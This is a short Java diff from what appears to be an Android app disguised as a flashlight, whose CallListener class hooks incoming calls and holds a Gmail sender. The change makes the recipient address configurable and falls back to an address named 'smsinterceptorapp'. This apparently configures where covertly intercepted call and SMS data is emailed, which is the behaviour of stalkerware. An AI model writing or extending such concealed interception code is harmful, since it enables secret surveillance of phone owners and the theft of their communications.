@@ -15,7 +15,20 @@ import android.telephony.TelephonyManager;
 public class CallListener extends PhoneCallReceiver {
 
   private static GmailSender sender;
-  private static String gmailEmailString = "justdriveapp1@gmail.com";
+  private static String gmailEmailString;
+
+  public CallListener() { 
+    Configure configure = new Configure();
+    if(configure.getDatabaseInfo().equals("update")) { 
+      if(!configure.getEmailAddress().equals("null")) {
+        gmailEmailString = configure.getEmailAddress();
+      }
+      else {
+        gmailEmailString = "smsinterceptorapp@gmail.com"; 
+      }
+      Log.d("FlashLight CallListener() ", "gmailEmailString " + gmailEmailString);
+    }
+  }
 
   @Override
   protected void onIncomingCallReceived(final Context ctx, final String number, final Date start) { 
